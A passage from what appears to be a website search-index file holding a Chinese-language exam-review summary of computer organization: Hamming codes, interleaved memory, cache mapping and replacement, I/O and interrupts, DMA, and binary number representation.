\u53c2\u770bP94\u9875\uff0c\u4f8b4.1</p> <p>13\u3001\u5047\u8bbe\u6b32\u68c0\u6d4b\u7684\u4e8c\u8fdb\u5236\u4ee3\u7801\u4e3an\u4f4d\uff0c\u4e3a\u4e86\u4f7f\u5176\u5177\u67091\u4f4d\u7684\u7ea0\u9519\u80fd\u529b\uff0c\u9700\u6dfb\u52a0K\u4f4d\u68c0\u6d4b\u4f4d\uff0c\u7ec4\u6210n+k\u4f4d\u7684\u4ee3\u7801\u3002\u95ee\uff0c\u5e94\u6dfb\u52a0\u591a\u5c11\u4f4d\u68c0\u6d4b\u4f4d\uff1f</p> <p>\u5e94\u6dfb\u52a0\u7684\u68c0\u6d4b\u4f4d\u4f4d\u6570\uff1a2\u7684k\u6b21\u65b9\u5927\u4e8e\u7b49\u4e8en+k+1\u3002 \u56e0\u4e3a\u8981\u4f7f\u5176\u67091\u4f4d\u7684\u68c0\u6d4b\u80fd\u529b\uff0c\u5fc5\u987b\u4f7f\u7528k\u4f4d\u6765\u8bf4\u660en+k\u4f4d\u5230\u5e95\u54ea\u4e00\u4f4d\u51fa\u73b0\u4e86\u9519\u8bef\uff0ck\u4f4d\u80fd\u8868\u8fbe\u7684\u6570\u91cf\u4e3a2\u7684k\u6b21\u65b9\uff0c\u800cn+k\u4f4d\u5230\u5e95\u54ea\u4e00\u4f4d \u51fa\u73b0\u4e86\u9519\u8bef\u6216\u8005\u662f\u5168\u90e8\u6b63\u786e\uff0c\u5171\u6709n+k+1\u79cd\u72b6\u51b5\uff0c\u56e0\u6b64\uff0ck\u7684\u53d6\u503c\u9700\u8981\u6ee1\u8db3\uff1a2\u7684k\u6b21\u65b9\u5927\u4e8e\u7b49\u4e8en+k+1</p> <p>14\u3001\u5bf9\u4e8e\u6c49\u660e\u7801\uff0c\u5e94\u719f\u7ec3\u638c\u63e1\u6c49\u660e\u7801\u7684\u7f16\u7801\u65b9\u5f0f\uff08\u6309\u7167\u914d\u5076\u6216\u914d\u5947\u7684\u539f\u5219\uff09\uff0c\u4ee5\u53ca\u7ed9\u51fa\u6c49\u660e\u7801\uff0c\u5f97\u5230\u8981\u4f20\u9001\u7684\u539f\u59cb\u4fe1\u606f\uff08\u5305\u62ec\u7ea0\u9519\u8fc7\u7a0b\uff09\u3002</p> <p>15\u3001\u63d0\u9ad8\u8bbf\u5b58\u901f\u5ea6\u7684\u4e09\u79cd\u65b9\u5f0f\u3002 1\uff09\u91c7\u7528\u9ad8\u901f\u5143\u5668\u4ef6\uff1b 2\uff09\u91c7\u7528\u5b58\u50a8\u5c42\u6b21\u7ed3\u6784\uff1acache-\u4e3b\u5b58\u7ed3\u6784\uff1b 3\uff09\u8c03\u6574\u4e3b\u5b58\u7ed3\u6784\uff1a\u5305\u62ec\u5355\u4f53\u591a\u5b57\uff0c\u591a\u4f53\u5e76\u884c\u4e24\u79cd\u65b9\u5f0f\u3002</p> <p>16\u3001\u7b80\u8ff0\u5355\u4f53\u591a\u5b57\u7684\u5b58\u50a8\u7cfb\u7edf\u7684\u5de5\u4f5c\u539f\u7406\uff0c\u53ca\u5176\u4f18\u70b9\u3002 1\uff09\u5355\u4f53\u591a\u5b57\u5b58\u50a8\u7cfb\u7edf\u4e00\u6b21\u8bbf\u5b58\u53d6\u51fa\u591a\u4e2aCPU\u5b57\uff0c\u5373\u5b58\u50a8\u5b57\u4e3aCPU\u5b57\u7684n\u500d\uff08\u5047\u8bbe\u4e00\u6b21\u8bbf\u5b58\u53d6\u51fan\u4e2acpu\u5b57\uff09\u3002 2\uff09\u4f18\u70b9\u662f\uff1a\u663e\u8457\u63d0\u9ad8\u4e86\u5b58\u50a8\u5668\u5e26\u5bbd\u3002</p> <p>17\u3001\u591a\u4f53\u5e76\u884c\u7cfb\u7edf\u6709\u54ea\u4e24\u79cd\u7f16\u5740\u65b9\u5f0f\uff1f\u8bf7\u7b80\u8981\u8bf4\u660e\u5176\u7f16\u5740\u65b9\u5f0f\u53ca\u5176\u4f18\u70b9\u3002 1\uff09\u9ad8\u4f4d\u4ea4\u53c9\u7f16\u5740\u65b9\u5f0f\uff1a\u5b58\u50a8\u4f53\u7684\u7f16\u5740\u65b9\u5f0f\u4e3a\u987a\u5e8f\u5b58\u50a8\uff0c\u5373\u4e00\u4e2a\u5b58\u50a8\u4f53\u5b58\u6ee1\u540e\uff0c\u518d\u5b58\u5165\u4e0b\u4e00\u4e2a\uff1b\u5b58\u50a8\u5355\u5143\u5730\u5740\u7684\u9ad8\u4f4d\u4e3a\u5b58\u50a8\u4f53\u7684\u7f16\u53f7\u3002 \u9ad8\u4f4d\u4ea4\u53c9\u7f16\u5740\u5e76\u4e0d\u80fd\u63d0\u9ad8\u5355\u6b21\u8bbf\u5b58\u901f\u5ea6\uff0c\u4f46\u80fd\u4f7f\u591a\u5e94\u7528\u5e76\u884c\u8bbf\u5b58\uff0c\u63d0\u9ad8\u7cfb\u7edf\u7684\u5e76\u53d1\u6027\u3002</p> <p>2\uff09\u4f4e\u4f4d\u4ea4\u53c9\u7f16\u5740\u65b9\u5f0f\uff1a\u5b58\u50a8\u4f53\u7684\u7f16\u5740\u65b9\u5f0f\u4e3a\u4ea4\u53c9\u5b58\u50a8\u3002\u5373\u7a0b\u5e8f\u8fde\u7eed\u5b58\u653e\u5728\u76f8\u90bb\u7684\u5b58\u50a8\u4f53\u4e4b\u4e2d\u3002\u5b58\u50a8\u5355\u5143\u5730\u5740\u7684\u4f4e\u4f4d\u4e3a\u5b58\u50a8\u4f53\u7684\u7f16\u53f7\u3002 \u4f4e\u4f4d\u4ea4\u53c9\u7f16\u5740\u80fd\u663e\u8457\u63d0\u9ad8\u5355\u6b21\u8bbf\u5b58\u901f\u5ea6\u3002</p> <p>19\u3001\u5728\u56db\u4f4d\u4f4e\u4f4d\u4ea4\u53c9\u7f16\u5740\u4e2d\uff0c\u5047\u8bbe\u5b58\u53d6\u5468\u671f\u4e3aT\uff0c\u603b\u7ebf\u4f20\u8f93\u5468\u671f\u4e3a\u03c4\uff0c\u4e3a\u4e86\u5b9e\u73b0\u6d41\u6c34\u7ebf\u65b9\u5f0f\u5b58\u50a8\uff0c\u5e94\u6ee1\u8db3\u4ec0\u4e48\u6761\u4ef6\uff1f\u5982\u679c\u8fde\u7eed\u8bfb\u53d6\u56db\u4e2a\u5b57\uff0c\u6240\u9700\u8981\u7684\u65f6\u95f4\u662f\u591a\u5c11\uff1f 1\uff09T= 4\u03c4 2\uff09\u8fde\u7eed\u8bfb\u53d6\u56db\u4e2a\u5b57\uff0c\u6240\u9700\u8981\u7684\u65f6\u95f4\u4e3aT + \uff084-1\uff09\u03c4 \u6ce8\u610f\uff1a\u5047\u8bbe\u4e0d\u662f\u4f4e\u4f4d\u4ea4\u53c9\u7f16\u5740\uff0c\u800c\u662f\u9ad8\u4f4d\u4ea4\u53c9\u7f16\u5740\uff0c\u8fde\u7eed\u8bfb\u53d6\u56db\u4e2a\u5b57\u6240\u9700\u8981\u7684\u65f6\u95f4\u4ecd\u7136\u4e3a4T\u3002</p> <p>20\u3001\u9700\u8981\u5927\u5bb6\u638c\u63e1\u591a\u4f53\u5e76\u884c\u5b58\u50a8\u5668\u5728\u9ad8\u4f4d\u4ea4\u53c9\u7f16\u5740\uff08\u987a\u5e8f\u5b58\u50a8\uff09\u548c\u4f4e\u4f4d\u4ea4\u53c9\u7f16\u5740\uff08\u4ea4\u53c9\u5b58\u50a8\uff09\u7684\u60c5\u51b5\u4e0b\uff0c\u5b58\u50a8\u5668\u5e26\u5bbd\u7684\u8ba1\u7b97\u65b9\u5f0f\u3002</p> <p>21\u3001\u5728CPU\u548c\u5185\u5b58\u4e4b\u95f4\u5f15\u5165cache\u7684\u539f\u56e0\u3002</p> <p>1\uff09\u907f\u514dcpu\u7a7a\u7b49I/O\u8bbf\u5b58\uff1b 2\uff09\u7f13\u89e3CPU\u548c\u4e3b\u5b58\u901f\u5ea6\u4e0d\u5339\u914d\u7684\u95ee\u9898\u3002</p> <p>22\u3001\u4ec0\u4e48\u662f\u7a0b\u5e8f\u7684\u5c40\u90e8\u6027\u539f\u7406\u3002 CPU\u4ece\u4e3b\u5b58\u53d6\u6307\u4ee4\u6216\u6570\u636e\uff0c\u5728\u4e00\u5b9a\u65f6\u95f4\u5185\uff0c\u53ea\u662f\u5bf9\u4e3b\u5b58\u5c40\u90e8\u5730\u5740\u533a\u57df\u8bbf\u95ee\u3002</p> <p>23\u3001Cache\u547d\u4e2d\u7387\u3001\u5e73\u5747\u8bbf\u95ee\u65f6\u95f4\u4ee5\u53ca\u8bbf\u95ee\u6548\u7387\u7684\u8ba1\u7b97\u3002</p> <p>24\u3001Cache\u5199\u64cd\u4f5c\u6709\u54ea\u4e24\u79cd\u65b9\u5f0f\uff1f 1\uff09\u5199\u76f4\u8fbe\u6cd5\uff1a\u5199\u64cd\u4f5c\u65e2\u5199\u5165Cache\u53c8\u5199\u5165\u4e3b\u5b58\uff1b 2\uff09\u5199\u56de\u6cd5\uff1a\u53ea\u628a\u6570\u636e\u5199\u5165Cache\u800c\u4e0d\u5199\u5165\u4e3b\u5b58\uff0c\u5f53Cache\u4e2d\u6570\u636e\u88ab\u66ff\u6362\u51fa\u53bb\u4e4b\u540e\u624d\u5199\u5165\u4e3b\u5b58\u3002</p> <p>25\u3001\u5c06\u4e3b\u5b58\u5730\u5740\u6620\u5c04\u5230Cache\u5730\u5740\u79f0\u4e3a\u5730\u5740\u6620\u5c04\uff0c\u5e38\u89c1\u7684Cache\u6620\u5c04\u65b9\u5f0f\u6709\u54ea\u51e0\u79cd\uff1f \u76f4\u63a5\u6620\u5c04\u3001\u5168\u76f8\u8054\u6620\u5c04\u3001\u7ec4\u76f8\u8054\u6620\u5c04\u3002</p> <p>26\u3001\u76f4\u63a5\u6620\u5c04\u7684\u4f18\u7f3a\u70b9\uff1f \u4f18\u70b9\uff1a\u5730\u5740\u53d8\u6362\u901f\u5ea6\u5feb\u3002\u7f3a\u70b9\uff1acache\u5229\u7528\u7387\u4e0d\u9ad8\uff0c\u5757\u51b2\u7a81\u7387\u9ad8\uff1b</p> <p>27\u3001\u5168\u76f8\u8054\u6620\u5c04\u7684\u4f18\u7f3a\u70b9\uff1f \u4f18\u70b9\uff1acache\u5229\u7528\u7387\u9ad8\uff0c\u5757\u51b2\u7a81\u7387\u4f4e\u3002\u7f3a\u70b9\uff1a\u5730\u5740\u53d8\u6362\u590d\u6742\uff0c\u9700\u8981\u8f83\u591a\u7684\u786c\u4ef6\u3002</p> <p>28\u3001\u9700\u8981\u5927\u5bb6\u638c\u63e1\u5404\u79cd\u6620\u5c04\u65b9\u5f0f\u4e4b\u4e0b\uff0c\u5199\u51fa\u4e3b\u5b58\u5730\u5740\u683c\u5f0f\u3001cache\u5730\u5740\u683c\u5f0f\uff0c\u4ee5\u53ca\u4e3b\u5b58\u5730\u5740\u5411cache\u5730\u5740\u7684\u8f6c\u6362\u3002</p> <p>29\u3001Cache\u5e38\u7528\u7684\u66ff\u6362\u7b97\u6cd5\u6709\u54ea\u4e9b\uff1f\u54ea\u4e2a\u547d\u4e2d\u7387\u6700\u9ad8\uff1f 1\uff09\u5148\u8fdb\u5148\u51fa\u3001\u8fd1\u671f\u6700\u5c11\u4f7f\u7528\u7b97\u6cd5\u548c\u968f\u673a\u66ff\u6362\u7b97\u6cd5\uff1b 2\uff09\u547d\u4e2d\u7387\u6700\u9ad8\u7684\u662f\u8fd1\u671f\u6700\u5c11\u4f7f\u7528\u7b97\u6cd5\uff1b</p> <p>30\u3001\u78c1\u76d8\u7684\u4e09\u5730\u5740\u7ed3\u6784\u5305\u62ec\u54ea\u4e9b\uff1f \u67f1\u9762\u3001\u78c1\u5934\u53f7\u548c\u6247\u533a\u53f7</p>"},{"location":"other/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/#_5","title":"\u7b2c\u4e94\u7ae0 \u8f93\u5165\u8f93\u51fa\u7cfb\u7edf","text":"<p>1\u3001I/O\u7cfb\u7edf\u7684\u53d1\u5c55\u5927\u81f4\u53ef\u4ee5\u5206\u4e3a\u54ea4\u4e2a\u9636\u6bb5\uff1f</p> <p>1\uff09\u65e9\u671f\uff08\u5206\u6563\u8fde\u63a5\u3001\u4e32\u884c\u5de5\u4f5c\u3001\u7a0b\u5e8f\u67e5\u8be2\uff09 2\uff09\u63a5\u53e3\u6a21\u5757\u548cDMA\u9636\u6bb5\uff08\u603b\u7ebf\u8fde\u63a5\u3001\u5e76\u884c\u5de5\u4f5c\u3001\u4e2d\u65ad\u53caDMA\uff09 3\uff09\u901a\u9053\u9636\u6bb5\uff08\u901a\u9053\u662f\u5177\u6709\u7279\u6b8a\u529f\u80fd\u7684\u5904\u7406\u5668\uff09 4\uff09I/O\u5904\u7406\u673a\u9636\u6bb5 I/O\u7cfb\u7edf\u7684\u53d1\u5c55\u5b9e\u9645\u4e0a\u662f\u9010\u6b65\u5c06CPU\u4ece\u7e41\u91cd\u7684I/O\u5de5\u4f5c\u4e2d\u89e3\u653e\u51fa\u6765\u7684\u8fc7\u7a0b\uff1b</p> <p>2\u3001I/O\u8bbe\u5907\u7f16\u5740\u6709\u54ea\u4e24\u79cd\u65b9\u5f0f\uff1f\u5404\u6709\u4ec0\u4e48\u4f18\u7f3a\u70b9\uff1f</p> <p>1\uff09\u7edf\u4e00\u7f16\u5740\u65b9\u5f0f\uff1a\u548c\u5b58\u50a8\u5668\u7edf\u4e00\u7f16\u5740\uff0cI/O\u5730\u5740\u4f5c\u4e3a\u5b58\u50a8\u5668\u5730\u5740\u7684\u4e00\u90e8\u5206\uff1b\u65e0\u987b\u7528\u4e13\u7528\u7684I/O\u6307\u4ee4\uff0c\u4f46\u5360\u7528\u5b58\u50a8\u5668\u7a7a\u95f4\u3002 2\uff09\u72ec\u7acb\u7f16\u5740\u65b9\u5f0f\uff1a\u548c\u5b58\u50a8\u5730\u5740\u5206\u5f00\u7f16\u5740\uff0c\u9700\u7528\u4e13\u7528\u7684I/O\u6307\u4ee4\u3002</p> <p>3\u3001I/O\u8bbe\u5907\u4e0e\u4e3b\u673a\u7684\u8054\u7edc\u65b9\u5f0f\u6709\u54ea\u51e0\u79cd\uff1f</p> <p>I/O\u8bbe\u5907\u4e0e\u4e3b\u673a\u95f4\u4ea4\u4e92\u4fe1\u606f\u65f6\u5fc5\u987b\u4e86\u89e3\u5f7c\u6b64\u7684\u72b6\u6001\u3002\u6839\u636eI/O\u8bbe\u5907\u5de5\u4f5c\u901f\u5ea6\u7684\u4e0d\u540c\uff0c\u53ef\u4ee5\u5206\u4e3a3\u7c7b\uff1a 1\uff09\u7acb\u5373\u54cd\u5e94\uff1a\u4e0d\u7ba1\u5176\u72b6\u6001\uff08\u8ba4\u4e3a\u5176\u65f6\u523b\u51c6\u5907\u597d\uff09\uff0c\u9002\u7528\u4e8e\u6162\u901f\u8bbe\u5907\u3002 2\uff09\u5e94\u7b54\u4fe1\u53f7\uff1a\u901a\u8fc7\u5e94\u7b54\u4fe1\u53f7\u6765\u8fdb\u884c\u4ea4\u4e92\uff1b 3\uff09\u540c\u6b65\u65f6\u6807\uff1a\u91c7\u7528\u7edf\u4e00\u7684\u65f6\u949f\u4fe1\u53f7\u3002</p> <p>4\u3001I/O\u603b\u7ebf\u5305\u62ec\u54ea\u56db\u7c7b\uff1f \u6570\u636e\u7ebf\u3001\u8bbe\u5907\u9009\u62e9\u7ebf\u3001\u72b6\u6001\u7ebf\u3001\u547d\u4ee4\u7ebf</p> <p>5\u3001I/O\u8bbe\u5907\u901a\u5e38\u4f7f\u7528D\u89e6\u53d1\u5668\uff08\u5b8c\u6210\u89e6\u53d1\u5668\uff09\u548cB\u89e6\u53d1\u5668\uff08\u5de5\u4f5c\u89e6\u53d1\u5668\uff09\u6765\u6807\u8bc6\u8bbe\u5907\u6240\u5904\u7684\u72b6\u6001\u3002 D=0\uff0cB=0\uff1a\u6682\u505c\u72b6\u6001\uff1b D=0\uff0cB=1\uff1a\u51c6\u5907\u72b6\u6001 D=1\uff0cB=0\uff1a\u5c31\u7eea\u72b6\u6001</p> <p>6\u3001\u7a0b\u5e8f\u67e5\u8be2\u7684\u57fa\u672c\u5de5\u4f5c\u539f\u7406\u3002 cpu\u4e0d\u65ad\u53bb\u67e5\u8be2I/O\u8bbe\u5907\u72b6\u6001\uff0c\u5bfc\u81f4CPU\u548cI/O\u8bbe\u5907\u4e32\u884c\u5de5\u4f5c\u3002</p> <p>7\u3001\u4ec0\u4e48\u662f\u4e2d\u65ad\uff1f \u8ba1\u7b97\u673a\u5728\u6267\u884c\u7a0b\u5e8f\u8fc7\u7a0b\u4e2d\uff0c\u5f53\u51fa\u73b0\u5f02\u5e38\u6e05\u7a7a\u6216\u7279\u6b8a\u8bf7\u6c42\u65f6\uff0c\u8ba1\u7b97\u673a\u505c\u6b62\u73b0\u884c\u7a0b\u5e8f\u7684\u8fd0\u884c\uff0c\u8f6c\u53bb\u5904\u7406\u8fd9\u4e9b\u5f02\u5e38\u6e05\u7a7a\u6216\u7279\u6b8a\u8bf7\u6c42\uff0c\u5904\u7406\u7ed3\u675f\u540e\uff0c\u518d\u8fd4\u56de\u73b0\u884c\u7a0b\u5e8f\u7684\u95f4\u65ad\u5904\uff0c\u7ee7\u7eed\u6267\u884c\u539f\u7a0b\u5e8f\uff0c\u5373\u4e3a\u4e2d\u65ad\u3002</p> <p>8\u3001\u4e2d\u65ad\u670d\u52a1\u7a0b\u5e8f\u7684\u57fa\u672c\u6d41\u7a0b\u5305\u62ec\u54ea\u56db\u90e8\u5206\uff1f 1\uff09\u4fdd\u62a4\u73b0\u573a 2\uff09\u4e2d\u65ad\u670d\u52a1 3\uff09\u6062\u590d\u73b0\u573a 4\uff09\u4e2d\u65ad\u8fd4\u56de</p> <p>9\u3001\u4ec0\u4e48\u662f\u5355\u91cd\u4e2d\u65ad\u548c\u591a\u91cd\u4e2d\u65ad\uff1f 1\uff09\u5355\u91cd\u4e2d\u65ad\uff1a\u4e0d\u5141\u8bb8\u4e2d\u65ad\u73b0\u884c\u7684\u4e2d\u65ad\u670d\u52a1\u7a0b\u5e8f\uff1b 2\uff09\u591a\u91cd\u4e2d\u65ad\uff1a\u5141\u8bb8\u7ea7\u522b\u66f4\u9ad8\u7684\u4e2d\u65ad\u6e90\u4e2d\u65ad\u73b0\u884c\u7684\u4e2d\u65ad\u670d\u52a1\u7a0b\u5e8f\uff0c\u4e5f\u79f0\u4e3a\u4e2d\u65ad\u5d4c\u5957\uff1b</p> <p>10\u3001CPU\u54cd\u5e94\u4e2d\u65ad\u7684\u65f6\u673a\uff1f \u5f53\u524d\u6307\u4ee4\u6267\u884c\u5b8c\u6bd5\u540e\uff0ccpu\u53d1\u51fa\u4e2d\u65ad\u67e5\u8be2\u4fe1\u53f7\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u4e2d\u65ad\u54cd\u5e94\u4e00\u5b9a\u662f\u5728\u6bcf\u6761\u6307\u4ee4\u6267\u884c\u7ed3\u675f\u4e4b\u540e\u8fdb\u884c\u7684\uff0c\u4e0d\u53ef\u80fd\u5728\u6307\u4ee4\u6267\u884c\u8fc7\u7a0b\u4e2d\u54cd\u5e94\u4e2d\u65ad\u3002</p> <p>11\u3001\u4ec0\u4e48\u662fDMA\uff1f DMA\uff1a\u76f4\u63a5\u5185\u5b58\u8bbf\u95ee\u3002\u5728\u4e3b\u5b58\u548cI/O\u8bbe\u5907\u4e4b\u95f4\u5efa\u7acb\u72ec\u7acb\u7684\u603b\u7ebf\u8fde\u63a5\u3002</p> <p>12\u3001\u5728DMA\u65b9\u5f0f\u4e2d\uff0c\u7531\u4e8eDMA\u63a5\u53e3\u4e0eCPU\u5171\u4eab\u4e3b\u5b58\uff0c\u53ef\u80fd\u4f1a\u51fa\u73b0\u4e24\u8005\u4e89\u7528\u4e3b\u5b58\u7684\u51b2\u7a81\uff0c\u4e3a\u89e3\u51b3\u51b2\u7a81\uff0cDMA\u548c\u4e3b\u5b58\u4ea4\u6362\u6570\u636e\u65f6\uff0c\u901a\u5e38\u91c7\u7528\u54ea\u4e09\u79cd\u5de5\u4f5c\u65b9\u5f0f\uff1f 1\uff09\u505c\u6b62CPU\u8bbf\u95ee\u4e3b\u5b58\uff1aDMA\u8bbf\u5b58\u4f18\u5148\u7ea7\u9ad8\uff1b 2\uff09\u5468\u671f\u632a\u7528\uff08\u7a83\u53d6\uff09\uff1aDMA\u632a\u7528\u5b58\u50a8\u6216\u7a83\u53d6\u603b\u7ebf\u4f7f\u7528\u6743\u4e00\u4e2a\u6216\u51e0\u4e2a\u4e3b\u5b58\u5b58\u53d6\u5468\u671f\uff1b 3\uff09DMA\u548cCPU\u4ea4\u66ff\u8bbf\u95ee\uff1a\u5c06CPU\u5de5\u4f5c\u5468\u671f\u5206\u6210\u4e24\u90e8\u5206\uff0c\u4e00\u90e8\u5206\u4f9bDMA\u8bbf\u5b58\uff0c\u4e00\u90e8\u5206\u4f9bCPU\u8bbf\u5b58\u3002</p> <p>13\u3001DMA\u5de5\u4f5c\u8fc7\u7a0b\u5305\u62ec\u54ea\u4e09\u90e8\u5206\uff1f 1\uff09\u9884\u5904\u7406 2\uff09\u6570\u636e\u4f20\u8f93 2\uff09\u540e\u5904\u7406</p>"},{"location":"other/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/#_6","title":"\u7b2c\u516d\u7ae0 \u8ba1\u7b97\u673a\u7684\u8fd0\u7b97\u65b9\u6cd5","text":"<p>1\u3001\u638c\u63e1\u6709\u7b26\u53f7\u6570\u7684\u539f\u7801\u8ba1\u7b97\u65b9\u6cd5\uff0c\u4ee5\u53ca\u901a\u8fc7\u539f\u7801\u6c42\u771f\u503c\uff1b</p> <p>2\u3001\u638c\u63e1\u8865\u7801\u8ba1\u7b97\u7684\u65b9\u6cd5\uff0c\u4ee5\u53ca\u901a\u8fc7\u8865\u7801\u6c42\u539f\u7801\uff0c\u7136\u540e\u6c42\u771f\u503c\u7684\u65b9\u6cd5\u3002</p> <p>1\uff09\u901a\u8fc7\u539f\u7801\u6c42\u8865\u7801\uff1a\u7b26\u53f7\u4f4d\u4e0d\u53d8\uff0c\u5404\u4f4d\u53d6\u53cd\uff0c\u672b\u4f4d\u52a01\uff1b 2\uff09\u901a\u8fc7\u8865\u7801\u6c42\u539f\u7801\uff1a\u7b26\u53f7\u4f4d\u4e0d\u53d8\uff0c\u5404\u4f4d\u53d6\u53cd\uff0c\u672b\u4f4d\u52a01\uff1b</p> <p>3\u3001\u539f\u7801\u4e2d0\u67092\u79cd\u8868\u793a\u65b9\u6cd5\uff08\u6b63\u96f6\u548c\u8d1f\u96f6\uff09\uff0c\u8865\u7801\u4e2d0\u53ea\u6709\u4e00\u79cd\u8868\u793a\u65b9\u6cd5\uff08\u6b63\u96f6\u548c\u8d1f\u96f6\u7684\u8868\u793a\u65b9\u6cd5\u4e00\u81f4\uff09</p> <p>4\u3001\u5047\u8bbe\u6709\u7b26\u53f7\u6570\u7684\u4f4d\u6570\u4e3a8\uff08\u5305\u62ec\u7b26\u53f7\u4f4d\uff09\uff0c\u8865\u7801\u80fd\u8868\u793a\u7684\u771f\u503c\u7684\u8303\u56f4\uff1f \u8865\u7801\u80fd\u8868\u793a\u7684\u771f\u503c\u8303\u56f4\u4e3a-128~+127\uff08\u53c2\u89c1\u8865\u7801\u5b9a\u4e49\uff09</p> <p>5\u3001\u638c\u63e1\u6c42\u53cd\u7801\u4ee5\u53ca\u79fb\u7801\u7684\u65b9\u6cd5\u3002</p> <p>6\u3001\u4ec0\u4e48\u662f\u5b9a\u70b9\u8868\u793a\uff1f\u4ec0\u4e48\u662f\u6d6e\u70b9\u8868\u793a\uff1f \uff11\uff09\u5b9a\u70b9\u8868\u793a\uff1a\u5c0f\u6570\u70b9\u56fa\u5b9a\u5728\u67d0\u4e00\u4f4d\u7f6e\u7684\u6570\u4e3a\u5b9a\u70b9\u6570\uff1b \uff12\uff09\u6d6e\u70b9\u8868\u793a\uff1a\u5c0f\u6570\u70b9\u4f4d\u7f6e\u53ef\u4ee5\u6d6e\u52a8\u7684\u6570\u3002</p> <p>7\u3001\u6d6e\u70b9\u6570\u5728\u673a\u5668\u4e2d\u7684\u8868\u793a\u5f62\u5f0f\uff0c\u7531\u54ea\u51e0\u90e8\u5206\u7ec4\u6210\uff1f \u7531\u5c3e\u6570\u3001\u6570\u7b26\u3001\u9636\u7801\u3001\u9636\u7b26\u56db\u90e8\u5206\u7ec4\u6210\u3002</p> <p>8\u3001\u638c\u63e1\u89c4\u683c\u5316\u6d6e\u70b9\u6570\u7684\u8868\u793a\u8303\u56f4\uff08\u6700\u5927\u6b63\u6570\u3001\u6700\u5c0f\u6b63\u6570\u3001\u6700\u5927\u8d1f\u6570\u3001\u6700\u5c0f\u8d1f\u6570\uff09\u7684\u8ba1\u7b97\u65b9\u6cd5\u3002</p> <p>9\u3001IEEE754\u6807\u51c6\u89c4\u5b9a\u7684\u6d6e\u70b9\u6570\u7531\u54ea\u51e0\u90e8\u5206\u7ec4\u6210\uff1f \u7531\u6570\u7b26\u3001\u9636\u7801\uff08\u542b\u9636\u7b26\uff09\u4ee5\u53ca\u5c3e\u6570\u7ec4\u6210\u3002</p> <p>10\u3001IEEE754\u6807\u51c6\u89c4\u5b9a\u7684\u6d6e\u70b9\u6570\u4e2d\uff0c\u9636\u7801\u548c\u5c3e\u6570\u7528\u4ec0\u4e48\u5f62\u5f0f\u8868\u793a\uff1f \u9636\u7801\u7528\u79fb\u7801\u8868\u793a\uff0c\u5176\u504f\u79fb\u91cf\u662f2^(n-1)\uff0c\u5c3e\u6570\u7528\u539f\u7801\u8868\u793a\u3002</p> <p>11\u3001float\u5360\u591a\u5c11\u4f4d\uff1fdouble\u5360\u591a\u5c11\u4f4d\uff1f</p> <p>float\u4e3a\u77ed\u5b9e\u6570\uff0c\u536032\u4f4d\uff0c\u5176\u4e2d\u9636\u78018\u4f4d\uff0c\u5c3e\u657023\u4f4d\u3002 double\u4e3a\u957f\u5b9e\u6570\uff0c\u536064\u4f4d\uff0c\u5176\u4e2d\u9636\u7801\u536011\u4f4d\uff0c\u5c3e\u6570\u4e3a52\u4f4d\u3002</p> <p>12\u3001\u5bf9\u6b63\u6570\u8fdb\u884c\u7b97\u672f\u79fb\u4f4d\uff0c\u5f53\u6b63\u6570\u91c7\u7528\u6e90\u7801\u3001\u8865\u7801\u3001\u53cd\u7801\u65f6\uff0c\u5de6\u79fb\u6216\u53f3\u79fb\u65f6\uff0c\u4f4e\u4f4d\u6216\u9ad8\u4f4d\u6dfb\u8865\u4ec0\u4e48\u4ee3\u7801\uff1f \u5bf9\u4e8e\u6b63\u6570\uff0c\u5176\u6e90\u7801\u3001\u8865\u7801\u3001\u53cd\u7801\u5747\u7b49\u4e8e\u771f\u503c\uff0c\u5de6\u79fb\u65f6\uff0c\u4f4e\u4f4d\u6dfb\u88650\uff0c\u53f3\u79fb\u65f6\uff0c\u9ad8\u4f4d\u6dfb\u88650\u3002</p> <p>13\u3001\u5bf9\u8d1f\u6570\u8fdb\u884c\u7b97\u672f\u79fb\u4f4d\uff0c\u5f53\u8d1f\u6570\u91c7\u7528\u6e90\u7801\u3001\u8865\u7801\u3001\u53cd\u7801\u65f6\uff0c\u5de6\u79fb\u6216\u53f3\u79fb\u65f6\uff0c\u4f4e\u4f4d\u6216\u9ad8\u4f4d\u6dfb\u8865\u4ec0\u4e48\u4ee3\u7801\uff1f \u5bf9\u4e8e\u6e90\u7801\uff0c\u5de6\u79fb\u6216\u53f3\u79fb\u65f6\uff0c\u4f4e\u4f4d\u6216\u9ad8\u4f4d\u5747\u6dfb\u88650\uff1b \u5bf9\u4e8e\u8865\u7801\uff1a\u5de6\u79fb\u65f6\uff0c\u4f4e\u4f4d\u6dfb\u88650\uff0c\u53f3\u79fb\u65f6\u9ad8\u4f4d\u6dfb\u88651 \u5bf9\u4e8e\u53cd\u7801\uff1a\u5de6\u79fb\u6216\u53f3\u79fb\u65f6\uff0c\u4f4e\u4f4d\u6216\u9ad8\u4f4d\u5747\u6dfb\u88651\uff1b</p> <p>14\u3001\u4ec0\u4e48\u662f\u903b\u8f91\u79fb\u4f4d\uff1f \u903b\u8f91\u79fb\u4f4d\u662f\u5bf9\u65e0\u7b26\u53f7\u6570\u7684\u79fb\u4f4d\uff0c\u7531\u4e8e\u65e0\u7b26\u53f7\u6570\u4e0d\u5b58\u5728\u7b26\u53f7\u4f4d\uff0c\u5de6\u79fb\u65f6\uff0c\u9ad8\u4f4d\u79fb\u4e22\uff0c\u4f4e\u4f4d\u8865\u96f6\u3002\u53f3\u79fb\u65f6\uff0c\u4f4e\u4f4d\u79fb\u4e22\uff0c\u9ad8\u4f4d\u8865\u96f6\u3002</p> <p>15\u3001\u52a0\u6cd5\u548c\u51cf\u6cd5\u65f6\uff0c\u4ec0\u4e48\u60c5\u51b5\u4e0b\u53ef\u80fd\u53d1\u751f\u6ea2\u51fa\uff1f\u5982\u4f55\u7b80\u5355\u5224\u65ad\u53d1\u751f\u6ea2\u51fa\uff1f</p> <p>1\uff09\u6b63\u6570\u52a0\u6b63\u6570\uff0c\u6b63\u6570\u51cf\u8d1f\u6570\uff0c\u8d1f\u6570\u52a0\u8d1f\u6570\uff0c\u8d1f\u6570\u51cf\u6b63\u6570\u65f6\uff0c\u53ef\u80fd\u4f1a\u53d1\u751f\u6ea2\u51fa\u3002 